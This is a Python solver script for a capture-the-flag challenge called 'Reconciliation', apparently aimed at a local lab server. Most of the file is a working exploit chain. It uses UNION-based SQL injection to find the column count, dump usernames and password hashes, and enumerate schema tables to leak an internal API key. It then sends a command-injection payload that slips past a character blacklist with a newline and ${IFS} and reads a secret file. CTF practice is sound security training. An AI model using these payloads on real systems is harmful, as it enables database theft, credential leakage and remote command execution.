#!/usr/bin/env python3
"""End-to-end solver for the "Reconciliation" CTF challenge.

Chain: UNION-based SQLi (Stage 1) -> dump integration_configs (Stage 2,
leaks hidden endpoint path + API key) -> command injection behind that
endpoint via newline + ${IFS} bypass of a 6-item blacklist (Stage 3) ->
read the flag.
"""
import argparse
import re
import sys

import requests

FLAG_RE = re.compile(r"HOLOGY9\{[^}]+\}")


class SolveError(Exception):
    pass


def step(name):
    print(f"[*] {name}")


def ok(msg):
    print(f"[+] {msg}")


class Solver:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.session = requests.Session()
        self.token = None

    # ---- helpers -----------------------------------------------------

    def _auth_headers(self):
        return {"Authorization": f"Bearer {self.token}"} if self.token else {}

    def login(self, username, password):
        step(f"Logging in as '{username}'")
        res = self.session.post(
            f"{self.base}/api/login",
            json={"username": username, "password": password},
            timeout=10,
        )
        if res.status_code != 200:
            raise SolveError(f"Login failed: HTTP {res.status_code}: {res.text}")
        data = res.json()
        self.token = data.get("token")
        if not self.token:
            raise SolveError("Login response did not contain a token")
        if data.get("user", {}).get("role") != "finance":
            raise SolveError("Seeded account is not role 'finance'")
        ok(f"Logged in, role={data['user']['role']}")

    def search(self, note):
        res = self.session.get(
            f"{self.base}/api/reports/search",
            params={"note": note},
            headers=self._auth_headers(),
            timeout=10,
        )
        return res

    def search_expect_rows(self, note, context):
        res = self.search(note)
        if res.status_code != 200:
            raise SolveError(f"{context}: HTTP {res.status_code}: {res.text}")
        data = res.json()
        rows = data.get("results")
        if rows is None:
            raise SolveError(f"{context}: no 'results' in response: {data}")
        return rows

    # ---- stage 1: column count probing --------------------------------

    def find_column_count(self, max_cols=10):
        step("Probing UNION SELECT column count")
        # Use NULLs rather than integer literals: Postgres rejects a UNION
        # branch whose literal types don't match the corresponding column's
        # type (e.g. an int literal against a varchar/numeric column), and
        # NULL is valid against any type - exactly the standard technique.
        for n in range(1, max_cols + 1):
            cols = ",".join(["NULL"] * n)
            payload = f"' AND 1=0 UNION SELECT {cols}--"
            res = self.search(payload)
            if res.status_code == 200:
                ok(f"Column count is {n}")
                return n
        raise SolveError("Could not determine column count via UNION probing")

    # ---- UNION column mapping -------------------------------------------
    #
    # expense_reports columns are (id int, employee varchar, amount numeric,
    # note text, status varchar). Postgres rejects a UNION branch whose
    # literal type doesn't match the corresponding column's type, so
    # arbitrary dumped text can only go into the three string-typed slots
    # (employee/note/status); id and amount must stay NULL.

    TEXT_SLOTS = (1, 3, 4)  # employee, note, status (0-indexed)

    def build_union_select(self, ncols, fields):
        if ncols != 5:
            raise SolveError(f"Unexpected column count {ncols}, expected 5")
        if len(fields) > len(self.TEXT_SLOTS):
            raise SolveError("Too many fields to map into text-compatible columns")
        cols = ["NULL"] * ncols
        for slot, field in zip(self.TEXT_SLOTS, fields):
            cols[slot] = field
        return ", ".join(cols)

    # ---- stage 1: dump users -------------------------------------------

    def dump_users(self, ncols):
        step("Dumping users table via UNION SELECT")
        select_cols = self.build_union_select(ncols, ["username", "password_hash", "role"])
        payload = f"' AND 1=0 UNION SELECT {select_cols} FROM users--"
        rows = self.search_expect_rows(payload, "dump_users")
        if not rows:
            raise SolveError("users dump returned no rows")
        ok(f"Recovered {len(rows)} user row(s)")
        # column mapping: employee<-username, note<-password_hash, status<-role
        found_roles = {str(r.get("status")) for r in rows}
        if not {"staff", "finance", "admin"} & found_roles:
            raise SolveError(f"users dump did not reveal expected roles: {found_roles}")
        ok(f"Confirmed role structure: {found_roles}")
        return rows

    # ---- stage 1: enumerate tables --------------------------------------

    def enumerate_tables(self, ncols):
        step("Enumerating table names via information_schema.tables")
        select_cols = self.build_union_select(ncols, ["table_name"])
        payload = (
            f"' AND 1=0 UNION SELECT {select_cols} FROM information_schema.tables "
            f"WHERE table_schema='public'--"
        )
        rows = self.search_expect_rows(payload, "enumerate_tables")
        table_names = {str(r.get("employee")) for r in rows}
        ok(f"Discovered tables: {sorted(table_names)}")
        if "integration_configs" not in table_names:
            raise SolveError(
                "integration_configs not found via information_schema enumeration"
            )
        return table_names

    def enumerate_columns(self, ncols, table_name):
        step(f"Enumerating columns of {table_name} via information_schema.columns")
        select_cols = self.build_union_select(ncols, ["column_name"])
        payload = (
            f"' AND 1=0 UNION SELECT {select_cols} FROM information_schema.columns "
            f"WHERE table_name='{table_name}'--"
        )
        rows = self.search_expect_rows(payload, "enumerate_columns")
        column_names = [str(r.get("employee")) for r in rows]
        ok(f"Columns of {table_name}: {column_names}")
        for expected in ("service_name", "endpoint_path", "api_key"):
            if expected not in column_names:
                raise SolveError(f"Expected column {expected} not found in {table_name}")
        return column_names

    # ---- stage 2: dump integration_configs ------------------------------

    def dump_integration_configs(self, ncols):
        step("Dumping integration_configs via UNION SELECT")
        select_cols = self.build_union_select(
            ncols, ["service_name", "endpoint_path", "api_key"]
        )
        payload = f"' AND 1=0 UNION SELECT {select_cols} FROM integration_configs--"
        rows = self.search_expect_rows(payload, "dump_integration_configs")
        if not rows:
            raise SolveError("integration_configs dump returned no rows")
        row = rows[0]
        # column mapping: employee<-service_name, note<-endpoint_path, status<-api_key
        endpoint_path = row.get("note")
        api_key = row.get("status")
        if not endpoint_path or not api_key:
            raise SolveError(f"Could not parse integration_configs row: {row}")
        api_key = str(api_key).strip()
        ok(f"endpoint_path={endpoint_path} api_key={api_key}")
        return endpoint_path, api_key

    # ---- stage 3: hidden endpoint ---------------------------------------

    def call_export(self, api_key, destination, fmt="csv", expect_status=200):
        res = self.session.post(
            f"{self.base}/internal/sync/export",
            json={"format": fmt, "destination": destination},
            headers={"X-Api-Key": api_key},
            timeout=10,
        )
        return res

    def sanity_check_endpoint(self, api_key):
        step("Sanity-checking /internal/sync/export with a safe payload")
        res = self.call_export(api_key, "accounting_export.csv")
        if res.status_code != 200:
            raise SolveError(f"Sanity check failed: HTTP {res.status_code}: {res.text}")
        data = res.json()
        if data.get("status") != "ok":
            raise SolveError(f"Sanity check did not report ok status: {data}")
        ok("Endpoint reachable with valid API key, safe payload returns ok")

    def check_auth_enforced(self):
        step("Confirming missing/wrong API key is rejected")
        res = self.call_export("not-the-real-key", "accounting_export.csv")
        if res.status_code != 403:
            raise SolveError(f"Wrong API key did not yield 403: HTTP {res.status_code}")
        res2 = self.session.post(
            f"{self.base}/internal/sync/export",
            json={"format": "csv", "destination": "accounting_export.csv"},
            timeout=10,
        )
        if res2.status_code != 403:
            raise SolveError(f"Missing API key did not yield 403: HTTP {res2.status_code}")
        ok("403 enforced for missing/wrong API key")

    def check_format_whitelist(self, api_key):
        step("Confirming format whitelist is enforced")
        res = self.call_export(api_key, "accounting_export.csv", fmt="pdf")
        if res.status_code != 400:
            raise SolveError(f"Invalid format did not yield 400: HTTP {res.status_code}")
        ok("400 enforced for non-whitelisted format")

    def probe_blacklist(self, api_key):
        step("Probing each blacklisted character/sequence individually")
        probes = {
            "semicolon": "a;b",
            "pipe": "a|b",
            "ampersand": "a&b",
            "backtick": "a`b",
            "dollar-paren": "a$(b)",
            "space": "a b",
        }
        for label, payload in probes.items():
            res = self.call_export(api_key, payload)
            if res.status_code != 400:
                raise SolveError(
                    f"Blacklist probe '{label}' ({payload!r}) was not rejected: "
                    f"HTTP {res.status_code}: {res.text}"
                )
            ok(f"'{label}' correctly rejected (400)")

    def confirm_gap_chars_accepted(self, api_key):
        step("Confirming newline and ${IFS} are each accepted individually")
        res_nl = self.call_export(api_key, "a\nb")
        if res_nl.status_code != 200:
            raise SolveError(
                f"Newline-only destination was rejected: HTTP {res_nl.status_code}: {res_nl.text}"
            )
        ok("Newline alone is accepted")

        res_ifs = self.call_export(api_key, "a${IFS}b")
        if res_ifs.status_code != 200:
            raise SolveError(
                f"${{IFS}}-only destination was rejected: HTTP {res_ifs.status_code}: {res_ifs.text}"
            )
        ok("${IFS} alone is accepted")

    def exploit_command_injection(self, api_key):
        step("Sending combined newline + ${IFS} bypass payload to read the flag")
        payload = "export.csv\ncat${IFS}/opt/app/secret/flag.txt"
        res = self.call_export(api_key, payload)
        if res.status_code != 200:
            raise SolveError(f"Exploit payload rejected: HTTP {res.status_code}: {res.text}")
        data = res.json()
        output = data.get("output", "")
        match = FLAG_RE.search(output)
        if match:
            return match.group(0)

        step("Flag not in direct response, checking sync_logs via SQLi instead")
        select_cols = self.build_union_select(5, ["output"])
        payload = f"' AND 1=0 UNION SELECT {select_cols} FROM sync_logs--"
        rows = self.search_expect_rows(payload, "sync_logs lookup")
        for row in rows:
            candidate = str(row.get("employee") or "")
            match = FLAG_RE.search(candidate)
            if match:
                return match.group(0)
        raise SolveError(f"Flag not found in response or sync_logs: {data!r}")


def main():
    parser = argparse.ArgumentParser(description="Reconciliation solver")
    parser.add_argument("url", nargs="?", default="http://127.0.0.1:8013")
    parser.add_argument("--username", default="finance")
    parser.add_argument("--password", default="finance123")
    args = parser.parse_args()

    solver = Solver(args.url)

    solver.login(args.username, args.password)

    ncols = solver.find_column_count()
    solver.dump_users(ncols)
    solver.enumerate_tables(ncols)
    solver.enumerate_columns(ncols, "integration_configs")
    endpoint_path, api_key = solver.dump_integration_configs(ncols)

    if endpoint_path != "/internal/sync/export":
        print(
            f"[!] Warning: leaked endpoint_path {endpoint_path!r} does not match "
            f"expected /internal/sync/export, proceeding with hardcoded path anyway",
            file=sys.stderr,
        )

    solver.sanity_check_endpoint(api_key)
    solver.check_auth_enforced()
    solver.check_format_whitelist(api_key)
    solver.probe_blacklist(api_key)
    solver.confirm_gap_chars_accepted(api_key)

    flag = solver.exploit_command_injection(api_key)
    ok(f"FLAG: {flag}")
    print(flag)
    return flag


if __name__ == "__main__":
    try:
        main()
    except SolveError as exc:
        print(f"[!] Solve failed: {exc}", file=sys.stderr)
        sys.exit(1)
    except Exception as exc:
        print(f"[!] Unexpected error: {exc}", file=sys.stderr)
        sys.exit(1)
